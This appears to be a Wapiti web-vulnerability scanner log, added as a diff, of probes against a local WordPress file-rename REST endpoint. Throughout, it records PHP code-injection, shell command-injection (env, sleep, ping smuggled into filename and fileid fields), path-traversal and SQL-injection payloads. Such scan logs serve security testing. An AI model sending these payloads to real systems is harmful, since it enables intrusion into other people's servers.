+2024-03-21 15:28:57.632 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:58.429 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:59.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:59.948 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:00.699 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:01.443 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:02.194 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:02.938 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:03.688 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:04.436 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:05.182 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%60%29%60 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:05.940 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%60sleep%2060%60 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:06.693 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%3Bsleep%2060%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:07.463 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%7Csleep%2060%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:08.239 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%26ping%20-n%2025%20127.0.0.1%26 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:08.999 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%3Benv%3B&fileid=45
+2024-03-21 15:29:09.807 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%7Cenv%7C&fileid=45
+2024-03-21 15:29:10.646 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%3Benv%3B&fileid=45
+2024-03-21 15:29:11.481 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%3Benv%3B&fileid=45
+2024-03-21 15:29:12.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&fileid=45
+2024-03-21 15:29:13.083 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%3Benv%3B&fileid=45
+2024-03-21 15:29:13.887 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%0Aenv%3B&fileid=45
+2024-03-21 15:29:14.700 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%26set%26&fileid=45
+2024-03-21 15:29:15.501 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=set&fileid=45
+2024-03-21 15:29:16.304 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=env&fileid=45
+2024-03-21 15:29:17.101 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%2Fe%00&fileid=45
+2024-03-21 15:29:17.898 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&fileid=45
+2024-03-21 15:29:18.694 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&fileid=45
+2024-03-21 15:29:19.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&fileid=45
+2024-03-21 15:29:20.327 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&fileid=45
+2024-03-21 15:29:21.135 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&fileid=45
+2024-03-21 15:29:21.939 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&fileid=45
+2024-03-21 15:29:22.740 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&fileid=45
+2024-03-21 15:29:23.536 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&fileid=45
+2024-03-21 15:29:24.335 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&fileid=45
+2024-03-21 15:29:25.148 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&fileid=45
+2024-03-21 15:29:25.954 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&fileid=45
+2024-03-21 15:29:26.754 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&fileid=45
+2024-03-21 15:29:27.564 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&fileid=45
+2024-03-21 15:29:28.394 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%60%29%60&fileid=45
+2024-03-21 15:29:29.227 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%60sleep%2060%60&fileid=45
+2024-03-21 15:29:30.043 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%3Bsleep%2060%3B&fileid=45
+2024-03-21 15:29:30.854 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=a%7Csleep%2060%3B&fileid=45
+2024-03-21 15:29:31.661 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%26ping%20-n%2025%20127.0.0.1%26&fileid=45
+2024-03-21 15:29:32.465 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%3Benv%3B
+2024-03-21 15:29:33.257 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%7Cenv%7C
+2024-03-21 15:29:34.052 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%3Benv%3B
+2024-03-21 15:29:34.848 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%3Benv%3B
+2024-03-21 15:29:35.636 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-21 15:29:36.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%3Benv%3B
+2024-03-21 15:29:37.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%0Aenv%3B
+2024-03-21 15:29:38.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%26set%26
+2024-03-21 15:29:38.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=set
+2024-03-21 15:29:39.675 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=env
+2024-03-21 15:29:40.479 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%2Fe%00
+2024-03-21 15:29:41.282 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 15:29:42.069 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 15:29:42.851 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 15:29:43.635 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 15:29:44.418 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 15:29:45.209 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 15:29:46.020 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 15:29:46.819 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 15:29:47.637 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 15:29:48.422 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 15:29:49.219 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 15:29:50.026 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 15:29:50.829 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-21 15:29:51.647 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%60%29%60
+2024-03-21 15:29:52.448 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%60sleep%2060%60
+2024-03-21 15:29:53.254 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%3Bsleep%2060%3B
+2024-03-21 15:29:54.040 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=a%7Csleep%2060%3B
+2024-03-21 15:29:54.830 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-21 15:29:55.643 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-21 15:29:55.671 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-21 15:29:55.694 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:55.694 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%C2%BF%27%22%28 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:56.439 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%2Fwpfm%2Fv1%2Ffile-rename%C2%BF%27%22%28&fileid=45
+2024-03-21 15:29:57.239 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%2Fwpfm%2Fv1%2Ffile-rename%C2%BF%27%22%28
+2024-03-21 15:29:58.855 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%20AND%2074%3D96%20AND%2017%3D17 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:29:59.614 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%20AND%2065%3D115%20AND%2048%3D48 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:00.416 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%20AND%2046%3D46%20AND%2027%3D27 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:01.160 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%27%20AND%2052%3D93%20AND%20%2781%27%3D%2781 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:01.921 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%27%20AND%2083%3D155%20AND%20%2727%27%3D%2727 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:02.701 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%27%20AND%2078%3D78%20AND%20%2737%27%3D%2737 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:03.447 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%22%20AND%2030%3D67%20AND%20%2256%22%3D%2256 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:04.195 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%22%20AND%2029%3D101%20AND%20%2279%22%3D%2279 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:04.950 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%22%20AND%2055%3D55%20AND%20%2236%22%3D%2236 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:05.700 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%29%20AND%2027%3D48%20AND%20%2828%3D28 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:06.445 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%29%20AND%2019%3D78%20AND%20%2815%3D15 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:07.192 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%29%20AND%2023%3D23%20AND%20%2885%3D85 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:07.937 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%27%29%20AND%2080%3D143%20AND%20%28%2773%27%3D%2773 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:08.680 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%27%29%20AND%2054%3D102%20AND%20%28%2777%27%3D%2777 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:09.426 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%27%29%20AND%2087%3D87%20AND%20%28%2726%27%3D%2726 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:10.220 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%22%29%20AND%2092%3D154%20AND%20%28%2266%22%3D%2266 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:10.981 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%22%29%20AND%2034%3D81%20AND%20%28%2251%22%3D%2251 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:11.735 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%22%29%20AND%2098%3D98%20AND%20%28%2265%22%3D%2265 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:30:12.473 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%20AND%2073%3D171%20AND%2018%3D18&fileid=45
+2024-03-21 15:30:13.283 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%20AND%2027%3D74%20AND%2049%3D49&fileid=45
+2024-03-21 15:30:14.094 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%20AND%2041%3D41%20AND%2097%3D97&fileid=45
+2024-03-21 15:30:14.955 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%27%20AND%2041%3D76%20AND%20%2728%27%3D%2728&fileid=45
+2024-03-21 15:30:15.758 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%27%20AND%2070%3D152%20AND%20%2794%27%3D%2794&fileid=45
+2024-03-21 15:30:16.560 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%27%20AND%2035%3D35%20AND%20%2729%27%3D%2729&fileid=45
+2024-03-21 15:30:17.365 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%22%20AND%2082%3D167%20AND%20%2211%22%3D%2211&fileid=45
+2024-03-21 15:30:18.180 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%22%20AND%2090%3D130%20AND%20%2230%22%3D%2230&fileid=45
+2024-03-21 15:30:18.986 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%22%20AND%2066%3D66%20AND%20%2235%22%3D%2235&fileid=45
+2024-03-21 15:30:19.789 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%29%20AND%2069%3D165%20AND%20%2825%3D25&fileid=45
+2024-03-21 15:30:20.601 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%29%20AND%2047%3D58%20AND%20%2832%3D32&fileid=45
+2024-03-21 15:30:21.422 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%29%20AND%2011%3D11%20AND%20%2866%3D66&fileid=45
+2024-03-21 15:30:22.233 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%27%29%20AND%2052%3D100%20AND%20%28%2793%27%3D%2793&fileid=45
+2024-03-21 15:30:23.040 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%27%29%20AND%2077%3D101%20AND%20%28%2726%27%3D%2726&fileid=45
+2024-03-21 15:30:23.852 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%27%29%20AND%2030%3D30%20AND%20%28%2724%27%3D%2724&fileid=45
